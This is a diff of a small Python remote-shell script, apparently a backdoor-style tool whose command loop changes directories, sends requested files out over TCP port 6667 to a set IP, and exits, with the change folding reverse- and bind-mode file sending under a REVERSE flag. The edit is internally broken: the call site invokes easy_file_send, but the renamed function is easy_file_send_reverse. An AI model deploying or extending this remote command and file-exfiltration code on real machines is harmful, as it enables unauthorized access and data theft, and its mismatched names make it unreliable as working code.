@@ -9,6 +9,8 @@ import socket
 
 IP='127.0.0.1'
 
+REVERSE=True
+
 class tcp_socket():
 
     def listen_on(self, port):
@@ -48,15 +50,15 @@ def easy_chdir(s):
     except:
         pass
     
-def file_send_reverse(filename, IP):
-    xf = tcp_socket()
-    xf.connect_to(IP, 6667)
-    xf.send_file(filename)
-    
-def file_send_bind(filename, IP):
-    xf = tcp_socket()
-    xf.listen_on(6667)
-    xf.send_file(filename)
+def easy_file_send_reverse(filename, IP):
+    if REVERSE == True:
+        xf = tcp_socket()
+        xf.connect_to(IP, 6667)
+        xf.send_file(filename)
+    else:
+        xf = tcp_socket()
+        xf.listen_on(6667)
+        xf.send_file(filename)
 
 # python2.7 and python3
 def to_bytes(s):
@@ -80,7 +82,7 @@ def easy_cmd(conn):
         if cmd.startswith('cd'):
             easy_chdir(cmd[3:len(cmd) - 1])
         elif cmd.startswith('download'):
-            file_send_reverse(cmd[9:len(cmd)-1], IP)
+            easy_file_send(cmd[9:len(cmd)-1], IP)
         elif cmd == "exit\n":
             conn.close()
             exit()
